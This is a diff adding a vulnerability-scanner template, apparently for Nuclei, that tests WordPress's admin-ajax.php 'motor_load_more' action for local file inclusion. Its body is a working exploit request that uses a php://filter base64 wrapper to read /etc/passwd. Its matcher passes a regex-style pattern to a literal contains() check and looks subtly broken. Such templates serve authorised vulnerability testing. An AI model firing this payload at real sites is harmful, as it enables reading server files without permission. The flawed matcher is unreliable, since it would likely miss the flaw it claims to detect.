@@ -1,0 +1,30 @@
+id: wordpress-admin-ajax-phpfilter-fileread
+info:
+  name: WordPress admin-ajax.php File Inclusion Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: lfi, wordpress
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/wp-admin/admin-ajax.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary0HCPrcv8camxolzm"
+    body: |
+      ------WebKitFormBoundary0HCPrcv8camxolzm
+      Content-Disposition: form-data; name="action"
+
+      motor_load_more
+      ------WebKitFormBoundary0HCPrcv8camxolzm
+      Content-Disposition: form-data; name="file"
+
+      php://filter/convert.base64-encode/resource=/etc/passwd
+      ------WebKitFormBoundary0HCPrcv8camxolzm--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(base64_decode(http_body), "root:.*:0:0:")
